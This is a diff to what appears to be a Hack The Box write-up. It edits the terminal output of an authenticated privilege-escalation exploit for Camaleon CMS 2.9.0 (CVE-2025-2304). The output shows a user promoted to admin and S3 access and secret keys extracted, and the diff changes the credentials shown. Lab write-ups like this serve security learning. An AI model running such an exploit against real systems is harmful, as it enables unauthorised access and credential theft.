@@ -718,7 +718,7 @@ Breakdown:
 
 ```shell
 ┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
-└─$ python3 exploit.py -u http://facts.htb -U attacker -P hello1234 --newpass hello1234 -e -r   
+└─$ python3 exploit.py -u http://facts.htb -U attacker -P attacker --newpass attacker -e -r   
 [+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
 [+]Login confirmed
    User ID: 5
@@ -727,8 +727,8 @@ Breakdown:
    User ID: 5
    Updated User Role: admin
 [+]Extracting S3 Credentials
-   s3 access key: AKIA7886F8172322021E
-   s3 secret key: FV1VMOdcP9ZdLzo29AU/6tqeC42ZCTG6DgzVbGU8
+   s3 access key: AKIAE356689792F1158C
+   s3 secret key: gRlcC4QksN2C6aDm6epbgGm3fhY6aPkKFNTUQeot
    s3 endpoint: http://localhost:54321
 [+]Reverting User Role
    User ID: 5
